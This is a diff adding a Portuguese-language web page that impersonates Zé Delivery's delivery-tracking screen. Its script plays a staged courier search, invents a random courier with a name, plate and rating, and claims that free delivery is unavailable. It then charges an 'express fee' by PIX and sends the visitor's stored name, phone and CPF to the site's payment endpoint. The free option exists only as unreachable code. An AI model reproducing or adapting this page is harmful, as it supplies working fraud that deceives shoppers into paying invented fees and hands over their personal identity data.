@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Acompanhar Entrega - Zé Delivery</title>
+  <!-- Meta Pixel Code -->
+  <script>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '1510776000355013');
+  fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=1510776000355013&ev=PageView&noscript=1"
+  /></noscript>
+  <!-- End Meta Pixel Code -->
+  <!-- UTMify UTMs -->
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+  <!-- UTMify Pixel -->
+  <script>
+    window.pixelId = "69f2f1c293857094144d9ac5";
+    var a = document.createElement("script");
+    a.setAttribute("async", ""); a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html { overflow-x: hidden; }
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: #f5f5f5;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* ── Header ── */
+    .header {
+      background: #1a1a1a;
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .header img { width: 36px; height: 36px; border-radius: 50%; object-fit: cover; border: 2px solid #ffcc01; }
+    .header-title { color: #fff; font-size: 15px; font-weight: 700; }
+    .header-sub   { color: #aaa; font-size: 11px; }
+
+    /* ── Main container ── */
+    .container {
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 20px 16px 40px;
+    }
+
+    /* ══════════════════════════════
+       FASE 1: BUSCANDO
+    ══════════════════════════════ */
+    #fase-buscando { display: block; }
+
+    .busca-card {
+      background: #fff;
+      border-radius: 20px;
+      padding: 32px 20px 28px;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(0,0,0,.08);
+    }
+
+    /* Radar */
+    .radar-wrap {
+      position: relative;
+      width: 120px; height: 120px;
+      margin: 0 auto 24px;
+    }
+    .radar-circle {
+      position: absolute;
+      border-radius: 50%;
+      border: 2px solid #ffcc01;
+      opacity: 0;
+      animation: radarPulse 2.4s ease-out infinite;
+    }
+    .radar-circle:nth-child(1) { width:100%; height:100%; top:0; left:0; animation-delay:0s; }
+    .radar-circle:nth-child(2) { width:70%;  height:70%;  top:15%; left:15%; animation-delay:.6s; }
+    .radar-circle:nth-child(3) { width:40%;  height:40%;  top:30%; left:30%; animation-delay:1.2s; }
+    @keyframes radarPulse {
+      0%   { transform: scale(.7); opacity: .8; }
+      100% { transform: scale(1.3); opacity: 0; }
+    }
+    .radar-dot {
+      position: absolute; top:50%; left:50%;
+      transform: translate(-50%,-50%);
+      width:16px; height:16px;
+      border-radius:50%;
+      background:#ffcc01;
+      box-shadow: 0 0 12px #ffcc01;
+    }
+    .radar-moto {
+      position: absolute; top:50%; left:50%;
+      width:100px; height:2px;
+      transform-origin: left center;
+      animation: orbitMoto 3s linear infinite;
+    }
+    @keyframes orbitMoto {
+      from { transform: translateY(-50%) rotate(0deg); }
+      to   { transform: translateY(-50%) rotate(360deg); }
+    }
+    .radar-moto i {
+      position:absolute; right:-4px; top:50%;
+      transform: translateY(-50%);
+      font-size:15px; color:#ffcc01;
+    }
+
+    .busca-title { font-size:17px; font-weight:700; color:#1a1a1a; margin-bottom:12px; }
+
+    .status-list { text-align: left; }
+    .status-item {
+      display: flex; align-items: flex-start; gap: 10px;
+      padding: 6px 0;
+      opacity: 0; transform: translateX(-12px);
+      transition: opacity .4s, transform .4s;
+      font-size: 12px; color: #555;
+    }
+    .status-item.visible { opacity: 1; transform: translateX(0); }
+    .status-item i { font-size: 12px; margin-top: 1px; flex-shrink: 0; }
+    .status-item.ok   i { color: #2e7d32; }
+    .status-item.err  i { color: #e53935; }
+    .status-item.spin i { color: #bbb; animation: spinAnim 1s linear infinite; }
+    @keyframes spinAnim { to { transform: rotate(360deg); } }
+
+    /* ══════════════════════════════
+       FASE 2: ENTREGADOR
+    ══════════════════════════════ */
+    #fase-entregador { display: none; }
+
+    /* Aviso de baixa disponibilidade — entre entregador e taxa */
+    .aviso-box {
+      background: #fff;
+      border-radius: 18px;
+      border-left: 4px solid #e53935;
+      padding: 16px 18px;
+      margin-bottom: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,.07);
+      animation: slideUp .4s .08s cubic-bezier(.25,.46,.45,.94) both;
+    }
+    .aviso-topo {
+      display: flex; align-items: center; gap: 8px;
+      margin-bottom: 10px;
+    }
+    .aviso-topo i { color: #e53935; font-size: 14px; }
+    .aviso-title { font-size: 13px; font-weight: 700; color: #1a1a1a; }
+    .aviso-desc  { font-size: 12px; color: #555; line-height: 1.6; margin-bottom: 8px; }
+    .aviso-desc b { color: #1a1a1a; }
+    .aviso-free-est {
+      display: inline-flex; align-items: center; gap: 6px;
+      background: #f0f0f0; border-radius: 8px;
+      padding: 7px 12px; font-size: 12px; color: #444; font-weight: 500;
+    }
+    .aviso-free-est i { color: #888; font-size: 11px; }
+
+    /* Card entregador */
+    .entregador-card {
+      background: #fff;
+      border-radius: 20px;
+      padding: 20px 18px;
+      box-shadow: 0 4px 20px rgba(0,0,0,.08);
+      margin-bottom: 12px;
+      animation: slideUp .4s .05s cubic-bezier(.25,.46,.45,.94) both;
+      overflow: hidden;
+    }
+    @keyframes slideUp {
+      from { transform: translateY(22px); opacity: 0; }
+      to   { transform: translateY(0);    opacity: 1; }
+    }
+
+    .entregador-top {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 16px;
+      min-width: 0;
+    }
+    .entregador-top > div:last-child { min-width: 0; flex: 1; }
+    .entregador-avatar {
+      width: 58px; height: 58px;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 20px; font-weight: 700; color: #fff;
+      flex-shrink: 0; letter-spacing: 1px;
+    }
+    .entregador-nome { font-size: 15px; font-weight: 700; color: #1a1a1a; margin-bottom: 1px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 180px; }
+    .entregador-sub  { font-size: 11px; color: #aaa; margin-bottom: 6px; }
+
+    /* Badge verificado — texto simples, discreto */
+    .verificado-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      font-size: 10.5px;
+      font-weight: 500;
+      color: #bbb;
+      letter-spacing: .1px;
+    }
+    .verificado-badge i { font-size: 9px; color: #bbb; }
+
+    .entregador-stats {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 6px;
+      background: #f7f7f7;
+      border-radius: 12px;
+      padding: 10px 8px;
+      margin-bottom: 14px;
+    }
+    .stat-item { text-align: center; }
+    .stat-val { font-size: 13px; font-weight: 700; color: #1a1a1a; }
+    .stat-lbl { font-size: 9px; color: #999; margin-top: 1px; }
+
+    .entregador-veiculo {
+      display: flex; align-items: center; gap: 8px;
+      font-size: 12px; color: #666;
+      border-top: 1px solid #f0f0f0;
+      padding-top: 12px;
+    }
+    .entregador-veiculo i { color: #bbb; font-size: 14px; }
+
+    /* Taxa box */
+    .taxa-box {
+      background: #fff;
+      border-radius: 16px;
+      padding: 16px 18px;
+      box-shadow: 0 4px 20px rgba(0,0,0,.08);
+      margin-bottom: 14px;
+      animation: slideUp .4s .1s cubic-bezier(.25,.46,.45,.94) both;
+    }
+    .taxa-header {
+      display: flex; align-items: center; justify-content: space-between; gap: 10px;
+    }
+    .taxa-title { font-size: 14px; font-weight: 700; color: #1a1a1a; margin-bottom: 3px; }
+    .taxa-prazo-sub { font-size: 12px; color: #888; }
+    .taxa-valor-num { font-size: 28px; font-weight: 700; color: #2e7d32; white-space: nowrap; }
+
+    /* Botões lado a lado */
+    .btns-row {
+      display: flex;
+      gap: 10px;
+      animation: slideUp .4s .15s cubic-bezier(.25,.46,.45,.94) both;
+      margin-bottom: 18px;
+    }
+    .btn-pagar {
+      flex: 1;
+      display: flex; align-items: center; justify-content: center; gap: 6px;
+      background: #ffcc01; color: #1a1a1a;
+      border: none; border-radius: 18px;
+      padding: 13px 8px;
+      font-family: 'Poppins', sans-serif;
+      font-weight: 700; font-size: 13px;
+      cursor: pointer; text-align: center;
+      transition: background .2s;
+      line-height: 1.3;
+    }
+    .btn-pagar:hover { background: #f0c000; }
+    .btn-pagar:disabled { opacity: .6; cursor: not-allowed; }
+
+    .btn-gratis {
+      flex: 1;
+      display: flex; align-items: center; justify-content: center;
+      background: transparent; color: #444;
+      border: 1.5px solid #bbb; border-radius: 18px;
+      padding: 13px 8px;
+      font-family: 'Poppins', sans-serif;
+      font-size: 12px; font-weight: 600;
+      cursor: pointer; text-align: center;
+      transition: border-color .2s, color .2s;
+      line-height: 1.3;
+    }
+    .btn-gratis:hover { border-color: #bbb; color: #444; }
+
+    .footer-note { font-size: 11px; color: #ccc; text-align: center; }
+
+    /* ══ PIX OVERLAY ══ */
+    #pix-overlay {
+      display: none;
+      position: fixed; inset: 0; z-index: 200;
+    }
+    #pix-overlay.open { display: flex; flex-direction: column; }
+    .pix-backdrop {
+      position: absolute; inset: 0;
+      background: rgba(0,0,0,.55);
+      backdrop-filter: blur(3px);
+    }
+    .pix-sheet {
+      position: absolute; bottom: 0; left: 0; right: 0;
+      background: #fff; border-radius: 22px 22px 0 0;
+      padding: 24px 22px 36px;
+      max-height: 92vh; overflow-y: auto;
+      animation: sheetUp .35s cubic-bezier(.25,.46,.45,.94) both;
+    }
+    @keyframes sheetUp {
+      from { transform: translateY(100%); }
+      to   { transform: translateY(0); }
+    }
+    .pix-handle { width:40px; height:4px; background:#ddd; border-radius:2px; margin: 0 auto 20px; }
+    .pix-title { font-size:17px; font-weight:700; color:#1a1a1a; text-align:center; margin-bottom:4px; }
+    .pix-sub   { font-size:12px; color:#888; text-align:center; margin-bottom:20px; }
+
+    .pix-timer {
+      background:#fff8e1; border:1px solid #ffe082; border-radius:12px;
+      padding:10px 16px; display:flex; align-items:center; gap:10px; margin-bottom:16px;
+    }
+    .pix-timer i { color:#f9a825; font-size:16px; }
+    .pix-timer-text { font-size:12px; color:#6d4c00; font-weight:600; }
+    .pix-timer-count { font-size:16px; font-weight:700; color:#e65100; }
+
+    .pix-qr-wrap { text-align:center; margin-bottom:16px; }
+    .pix-qr-wrap img { width:160px; height:160px; border-radius:12px; border:1px solid #eee; }
+    .pix-qr-skeleton {
+      width:160px; height:160px; border-radius:12px;
+      background:#f0f0f0; margin:0 auto;
+      animation: shimmer 1.4s ease-in-out infinite;
+    }
+    @keyframes shimmer { 0%,100%{opacity:1} 50%{opacity:.5} }
+
+    .pix-codigo-box { background:#f7f7f7; border-radius:12px; padding:12px 14px; margin-bottom:14px; }
+    .pix-codigo-lbl { font-size:10px; color:#999; font-weight:600; text-transform:uppercase; margin-bottom:6px; }
+    .pix-codigo-row { display:flex; align-items:center; gap:8px; }
+    .pix-codigo-val { font-size:10px; color:#555; word-break:break-all; flex:1; max-height:50px; overflow:hidden; }
+    .btn-copiar {
+      flex-shrink:0; background:#1a1a1a; color:#ffcc01;
+      border:none; border-radius:8px; padding:7px 12px;
+      font-family:'Poppins',sans-serif; font-size:11px; font-weight:700;
+      cursor:pointer; transition:opacity .2s;
+    }
+    .btn-copiar:active { opacity:.7; }
+    .pix-instrucoes { font-size:11px; color:#888; text-align:center; line-height:1.6; margin-bottom:16px; }
+    .btn-pix-fechar {
+      width:100%; background:transparent; border:1.5px solid #ddd; border-radius:20px;
+      padding:12px; font-family:'Poppins',sans-serif; font-size:13px; font-weight:600;
+      color:#888; cursor:pointer;
+    }
+
+    .pix-loading { text-align:center; padding:20px 0; }
+    .pix-loading i { font-size:28px; color:#ffcc01; animation:spinAnim 1s linear infinite; margin-bottom:10px; display:block; }
+    .pix-loading p { font-size:13px; color:#888; }
+
+    /* Toast */
+    .toast {
+      position:fixed; bottom:30px; left:50%;
+      transform: translateX(-50%) translateY(60px);
+      background:#1a1a1a; color:#fff; border-radius:20px;
+      padding:10px 22px; font-size:13px; font-weight:600;
+      z-index:999; transition:transform .35s cubic-bezier(.25,.46,.45,.94);
+      white-space:nowrap;
+    }
+    .toast.show { transform: translateX(-50%) translateY(0); }
+  </style>
+  <script src="js/protecao.js"></script>
+</head>
+<body>
+
+  <!-- Header -->
+  <div class="header">
+    <img src="images/ze-delivery-logo.webp" alt="Zé">
+    <div>
+      <div class="header-title">Zé Delivery</div>
+      <div class="header-sub">Acompanhar entrega</div>
+    </div>
+  </div>
+
+  <div class="container">
+
+    <!-- ══ FASE 1: BUSCANDO ══ -->
+    <div id="fase-buscando">
+      <div class="busca-card">
+        <div class="radar-wrap">
+          <div class="radar-circle"></div>
+          <div class="radar-circle"></div>
+          <div class="radar-circle"></div>
+          <div class="radar-dot"></div>
+          <div class="radar-moto"><i class="fa fa-motorcycle"></i></div>
+        </div>
+        <div class="busca-title" id="busca-title">Buscando entregador...</div>
+        <div class="status-list" id="status-list"></div>
+      </div>
+    </div>
+
+    <!-- ══ FASE 2: ENTREGADOR ══ -->
+    <div id="fase-entregador">
+
+      <!-- Card entregador -->
+      <div class="entregador-card">
+        <div class="entregador-top">
+          <div class="entregador-avatar" id="entregador-avatar">MR</div>
+          <div>
+            <div class="entregador-nome" id="entregador-nome">MARCOS RIBEIRO</div>
+          </div>
+        </div>
+        <div class="entregador-stats">
+          <div class="stat-item">
+            <div class="stat-val" id="stat-dist">3.2 km</div>
+            <div class="stat-lbl">Distância</div>
+          </div>
+          <div class="stat-item">
+            <div class="stat-val"><span id="tempo-num">24</span> min</div>
+            <div class="stat-lbl">Tempo est.</div>
+          </div>
+          <div class="stat-item">
+            <div class="stat-val" id="stat-rating">⭐ 4.9</div>
+            <div class="stat-lbl">Avaliação</div>
+          </div>
+        </div>
+        <div class="entregador-veiculo">
+          <i class="fa fa-motorcycle"></i>
+          <span id="entregador-veiculo-txt">Honda CG 160 · <b id="entregador-placa">FKT-3H82</b></span>
+        </div>
+      </div>
+
+      <!-- Aviso entre entregador e taxa -->
+      <div class="aviso-box" id="aviso-box">
+        <div class="aviso-topo">
+          <i class="fa fa-exclamation-circle"></i>
+          <div class="aviso-title">Não foi possível encontrar entregadores próximos</div>
+        </div>
+        <p class="aviso-desc">Devido à alta demanda na sua região, não encontramos parceiros disponíveis para entrega grátis. <b id="aviso-nome">—</b> pode realizar sua entrega dentro do prazo, porém uma Taxa de Entrega Expressa será cobrada, lamentamos o ocorrido.</p>
+      </div>
+
+      <!-- Taxa box -->
+      <div class="taxa-box">
+        <div class="taxa-header">
+          <div>
+            <div class="taxa-title">Taxa de entrega expressa</div>
+            <div class="taxa-prazo-sub" id="taxa-tempo-express">Prazo: ~28 min</div>
+          </div>
+          <div class="taxa-valor-num" id="taxa-valor">R$ 9,90</div>
+        </div>
+      </div>
+
+      <!-- Botão único -->
+      <div class="btns-row">
+        <button class="btn-pagar" id="btn-pagar" onclick="abrirPixTaxa()" style="width:100%">
+          PAGAR TAXA 🔴
+        </button>
+      </div>
+
+      <p class="footer-note">Zé Delivery — Entrega rápida e segura 🍺</p>
+    </div>
+
+  </div><!-- /container -->
+
+  <!-- ══ PIX OVERLAY ══ -->
+  <div id="pix-overlay">
+    <div class="pix-backdrop" onclick="fecharPixOverlay()"></div>
+    <div class="pix-sheet">
+      <div class="pix-handle"></div>
+      <div id="pix-loading" class="pix-loading">
+        <i class="fa fa-spinner"></i>
+        <p>Gerando seu PIX...</p>
+      </div>
+      <div id="pix-content" style="display:none">
+        <div class="pix-title">Pague via PIX</div>
+        <div class="pix-sub">Escaneie o QR Code ou copie o código</div>
+        <div class="pix-timer">
+          <i class="fa fa-clock"></i>
+          <div>
+            <div class="pix-timer-text">PIX expira em</div>
+            <div class="pix-timer-count" id="pix-timer-count">14:59</div>
+          </div>
+        </div>
+        <div class="pix-qr-wrap">
+          <img id="pix-qr-img" src="" alt="QR Code PIX" style="display:none">
+          <div class="pix-qr-skeleton" id="pix-qr-skeleton"></div>
+        </div>
+        <div class="pix-codigo-box">
+          <div class="pix-codigo-lbl">Código Pix copia e cola</div>
+          <div class="pix-codigo-row">
+            <div class="pix-codigo-val" id="pix-codigo-val">—</div>
+            <button class="btn-copiar" onclick="copiarCodigo()">Copiar</button>
+          </div>
+        </div>
+        <p class="pix-instrucoes">Abra o app do seu banco → Pix → Copia e Cola<br>ou escaneie o QR Code acima</p>
+        <button class="btn-pix-fechar" onclick="fecharPixOverlay()">Cancelar</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <script>
+    /* ══════════════════════════════════
+       DADOS
+    ══════════════════════════════════ */
+    var nomes = [
+      { nome: 'MARCOS RIBEIRO',   ini: 'MR', color: '#1a6eb5' },
+      { nome: 'CARLOS EDUARDO',   ini: 'CE', color: '#2e7d32' },
+      { nome: 'JOÃO VITOR',       ini: 'JV', color: '#6a1a6e' },
+      { nome: 'PEDRO HENRIQUE',   ini: 'PH', color: '#b5451a' },
+      { nome: 'LUCAS OLIVEIRA',   ini: 'LO', color: '#1a5eb5' },
+      { nome: 'RAFAEL SANTOS',    ini: 'RS', color: '#1a8050' },
+      { nome: 'THIAGO FERREIRA',  ini: 'TF', color: '#8b1a1a' },
+      { nome: 'ANDERSON COSTA',   ini: 'AC', color: '#5b2c6f' },
+      { nome: 'DIEGO ALMEIDA',    ini: 'DA', color: '#154360' },
+      { nome: 'GABRIEL LIMA',     ini: 'GL', color: '#1e8449' },
+    ];
+    var veiculos = [
+      'Honda CG 160', 'Honda Biz 125', 'Yamaha Factor 150',
+      'Honda Pop 110', 'Yamaha Fazer 150', 'Honda Bros 150',
+      'Suzuki Yes 125', 'Honda CB 300', 'Yamaha Crosser 150',
+    ];
+
+    function gerarPlaca() {
+      /* Formato Mercosul: ABC1D23 */
+      var L = 'ABCDEFGHJKLMNPQRSTUVWXYZ';
+      var N = '0123456789';
+      var r = function(s) { return s[Math.floor(Math.random() * s.length)]; };
+      return r(L)+r(L)+r(L)+r(N)+r(L)+r(N)+r(N);
+    }
+
+    function calcTaxa(valor) {
+      if (valor <= 48) return 9.90;
+      return 14.90;
+    }
+
+    function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+
+    /* ══════════════════════════════════
+       DADOS DA SESSÃO
+    ══════════════════════════════════ */
+    var qs = new URLSearchParams(location.search);
+    var valorPedido = parseFloat(qs.get('valor') || '0');
+    if (!valorPedido) {
+      try { valorPedido = parseFloat(JSON.parse(localStorage.getItem('ze_last_purchase')||'{}').total||'0'); } catch(e){}
+    }
+    var taxa = calcTaxa(valorPedido);
+
+    /* Gera entregador aleatório */
+    function gerarEntregador() {
+      var p    = pick(nomes);
+      var dist  = parseFloat((5.5 + Math.random() * 6.5).toFixed(1)); // 5.5–12.0 km
+      var tempo = Math.round(dist * 2.2 + Math.random() * 6 + 8);    // ~22–38 min
+      var rating = Math.random() > 0.45 ? 4.9 : 4.8;
+      return {
+        nome:    p.nome,
+        ini:     p.ini,
+        color:   p.color,
+        dist:    dist,
+        tempo:   tempo,
+        rating:  rating,
+        veiculo: pick(veiculos),
+        placa:   gerarPlaca(),
+      };
+    }
+
+    var entregador = gerarEntregador();
+
+    /* ══════════════════════════════════
+       SEQUÊNCIA DE BUSCA
+    ══════════════════════════════════ */
+    var statusItems = [
+      { delay:1200, cls:'spin', icon:'fa-spinner',      text:'Verificando entregadores em um raio de 5 km...' },
+      { delay:3500, cls:'err',  icon:'fa-times-circle', text:'Nenhum parceiro disponível nessa área.' },
+      { delay:4200, titleChange:'Expandindo área de busca...' },
+      { delay:4800, cls:'spin', icon:'fa-spinner',      text:'Verificando entregadores em um raio de 10 km...' },
+      { delay:7500, cls:'ok',   icon:'fa-check-circle', text:'Parceiro encontrado! Estimativa: ' + entregador.tempo + ' min.' },
+    ];
+
+    function adicionarStatusItem(item) {
+      if (item.titleChange) {
+        document.getElementById('busca-title').textContent = item.titleChange;
+        return;
+      }
+      var el = document.createElement('div');
+      el.className = 'status-item' + (item.cls ? ' ' + item.cls : '');
+      el.innerHTML = '<i class="fa ' + item.icon + '"></i><span>' + item.text + '</span>';
+      document.getElementById('status-list').appendChild(el);
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() { el.classList.add('visible'); });
+      });
+    }
+
+    function iniciarSequencia() {
+      document.getElementById('status-list').innerHTML = '';
+      document.getElementById('busca-title').textContent = 'Buscando entregador...';
+      statusItems.forEach(function(item) {
+        setTimeout(function() { adicionarStatusItem(item); }, item.delay);
+      });
+      setTimeout(mostrarEntregador, 9000);
+    }
+
+    function mostrarEntregador() {
+      document.getElementById('entregador-avatar').textContent        = entregador.ini;
+      document.getElementById('entregador-avatar').style.background   = entregador.color;
+      document.getElementById('entregador-nome').textContent          = entregador.nome;
+      document.getElementById('stat-dist').textContent                = entregador.dist + ' km';
+      document.getElementById('tempo-num').textContent                = entregador.tempo;
+      document.getElementById('stat-rating').textContent              = '⭐ ' + entregador.rating;
+      document.getElementById('entregador-veiculo-txt').innerHTML     =
+        '<i class="fa fa-motorcycle" style="color:#bbb;font-size:14px;margin-right:6px"></i>' +
+        entregador.veiculo + ' · <b>' + entregador.placa + '</b>';
+      document.getElementById('taxa-valor').textContent =
+        'R$ ' + taxa.toFixed(2).replace('.', ',');
+      document.getElementById('taxa-tempo-express').textContent =
+        'Prazo: ~' + entregador.tempo + ' min';
+      /* Nome no aviso */
+      var primeiroNome = entregador.nome.split(' ')[0].charAt(0) + entregador.nome.split(' ')[0].slice(1).toLowerCase();
+      document.getElementById('aviso-nome').textContent = primeiroNome;
+
+      document.getElementById('fase-buscando').style.display  = 'none';
+      document.getElementById('fase-entregador').style.display = 'block';
+
+      iniciarContagemEntregador();
+    }
+
+    var timerEntregador = null;
+    function iniciarContagemEntregador() {
+      var seg = entregador.tempo * 60;
+      clearInterval(timerEntregador);
+      timerEntregador = setInterval(function() {
+        seg--;
+        var m = Math.floor(seg / 60), s = seg % 60;
+        document.getElementById('tempo-num').textContent = m + ':' + (s < 10 ? '0' : '') + s;
+        if (seg <= 0) clearInterval(timerEntregador);
+      }, 1000);
+    }
+
+    /* ══════════════════════════════════
+       CONTINUAR GRÁTIS — loop ~8s
+    ══════════════════════════════════ */
+    function continuarGratis() {
+      clearInterval(timerEntregador);
+      entregador = gerarEntregador(); // novo entregador aleatório
+
+      document.getElementById('fase-entregador').style.display = 'none';
+      document.getElementById('fase-buscando').style.display   = 'block';
+
+      var quickItems = [
+        { delay:800,  cls:'spin', icon:'fa-spinner',      text:'Expandindo área de busca...' },
+        { delay:2500, cls:'err',  icon:'fa-times-circle', text:'Ainda buscando parceiros disponíveis...' },
+        { delay:3300, titleChange:'Tentando novamente...'},
+        { delay:5200, cls:'ok',   icon:'fa-check-circle', text:'Parceiro encontrado! Estimativa: ' + entregador.tempo + ' min.' },
+      ];
+      document.getElementById('status-list').innerHTML = '';
+      document.getElementById('busca-title').textContent = 'Buscando entregador...';
+      quickItems.forEach(function(item) {
+        setTimeout(function() { adicionarStatusItem(item); }, item.delay);
+      });
+      setTimeout(mostrarEntregador, 7800);
+    }
+
+    /* ══════════════════════════════════
+       PIX DA TAXA
+    ══════════════════════════════════ */
+    var pixTimerInterval = null;
+
+    function abrirPixTaxa() {
+      document.getElementById('btn-pagar').disabled = true;
+      document.getElementById('pix-overlay').classList.add('open');
+      document.getElementById('pix-loading').style.display  = 'block';
+      document.getElementById('pix-content').style.display  = 'none';
+      gerarPixTaxa();
+    }
+
+    function gerarPixTaxa() {
+      var ct = {};
+      try { ct = JSON.parse(localStorage.getItem('ze_last_purchase')||'{}').ct || {}; } catch(e) {}
+
+      /* Coleta UTMs do localStorage */
+      var utmKeys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','fbclid','src','sck'];
+      var utmPayload = {};
+      utmKeys.forEach(function(k) {
+        var v = localStorage.getItem('ze_' + k);
+        if (v) utmPayload[k] = v;
+      });
+
+      fetch('/api/criar-pix', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(Object.assign({
+          produto: 'Expresso',
+          valor:   taxa,
+          nome:    ct.nome || '',
+          tel:     ct.tel  || '',
+          cpf:     ct.cpf  || ''
+        }, utmPayload))
+      })
+      .then(function(r) { return r.json(); })
+      .then(function(d) {
+        var td      = d.data || d;
+        var txId    = String(td.id || td.transaction_id || '');
+        var pixData = td.pix || {};
+        var pixCode = pixData.qrcode || pixData.qr_code || '';
+        var pixImg  = (pixData.receiptUrl && pixData.receiptUrl !== 'null') ? pixData.receiptUrl
+                    : (pixData.url        && pixData.url        !== 'null') ? pixData.url
+                    : '';
+        if (pixCode && !pixImg) {
+          pixImg = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(pixCode);
+        }
+        if (!pixCode) throw new Error('sem código');
+        exibirPixTaxa(pixCode, pixImg, txId);
+      })
+      .catch(function(err) {
+        console.error('PIX taxa erro:', err);
+        document.getElementById('btn-pagar').disabled = false;
+        fecharPixOverlay();
+        showToast('Erro ao gerar PIX. Tente novamente.');
+      });
+    }
+
+    var taxaCheckInterval = null;
+
+    function exibirPixTaxa(pixCode, pixImg, txId) {
+      document.getElementById('pix-loading').style.display = 'none';
+      document.getElementById('pix-content').style.display = 'block';
+      document.getElementById('pix-codigo-val').textContent = pixCode;
+
+      if (pixImg) {
+        var img = document.getElementById('pix-qr-img');
+        img.onload = function() {
+          document.getElementById('pix-qr-skeleton').style.display = 'none';
+          img.style.display = 'block';
+        };
+        img.src = pixImg;
+      } else {
+        document.getElementById('pix-qr-skeleton').style.display = 'none';
+      }
+
+      var seg = 15 * 60;
+      clearInterval(pixTimerInterval);
+      pixTimerInterval = setInterval(function() {
+        seg--;
+        var m = Math.floor(seg/60), s = seg%60;
+        document.getElementById('pix-timer-count').textContent =
+          (m<10?'0':'')+m+':'+(s<10?'0':'')+s;
+        if (seg <= 0) clearInterval(pixTimerInterval);
+      }, 1000);
+
+      /* Polling de confirmação do pagamento da taxa */
+      clearInterval(taxaCheckInterval);
+      if (txId) {
+        taxaCheckInterval = setInterval(function() {
+          fetch('/api/status-pix/' + txId)
+            .then(function(r) { return r.json(); })
+            .then(function(d) {
+              var status = (d.status || '').toLowerCase();
+              if (status === 'authorized' || status === 'paid' || status === 'approved' || status === 'completed') {
+                clearInterval(taxaCheckInterval);
+                clearInterval(pixTimerInterval);
+                fecharPixOverlay();
+                showToast('✅ Taxa paga! Entregador a caminho.');
+                /* Mostra confirmação visual no card */
+                setTimeout(function() {
+                  document.getElementById('fase-entregador').innerHTML =
+                    '<div style="background:#fff;border-radius:20px;padding:32px 20px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.08)">'
+                    + '<div style="font-size:52px;margin-bottom:12px">✅</div>'
+                    + '<div style="font-size:18px;font-weight:700;color:#1a1a1a;margin-bottom:8px">Taxa confirmada!</div>'
+                    + '<div style="font-size:14px;color:#666;line-height:1.6">Seu entregador foi notificado e está a caminho.</div>'
+                    + '</div>';
+                }, 400);
+              }
+            })
+            .catch(function() {});
+        }, 5000);
+      }
+    }
+
+    function fecharPixOverlay() {
+      clearInterval(pixTimerInterval);
+      clearInterval(taxaCheckInterval);
+      document.getElementById('pix-overlay').classList.remove('open');
+      document.getElementById('btn-pagar').disabled = false;
+    }
+
+    function copiarCodigo() {
+      var val = document.getElementById('pix-codigo-val').textContent;
+      if (!val || val === '—') return;
+      navigator.clipboard.writeText(val)
+        .then(function() { showToast('Código copiado! ✓'); })
+        .catch(function() { showToast('Copie manualmente o código acima.'); });
+    }
+
+    /* Toast */
+    var toastTimer = null;
+    function showToast(msg) {
+      var t = document.getElementById('toast');
+      t.textContent = msg; t.classList.add('show');
+      clearTimeout(toastTimer);
+      toastTimer = setTimeout(function() { t.classList.remove('show'); }, 2600);
+    }
+
+    /* UTMs */
+    (function() {
+      var utmKeys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','fbclid'];
+      var params = new URLSearchParams(location.search);
+      utmKeys.forEach(function(k) {
+        var v = params.get(k);
+        if (v) localStorage.setItem('ze_' + k, v);
+      });
+    })();
+
+    /* INICIA */
+    iniciarSequencia();
+  </script>
+</body>
+</html>
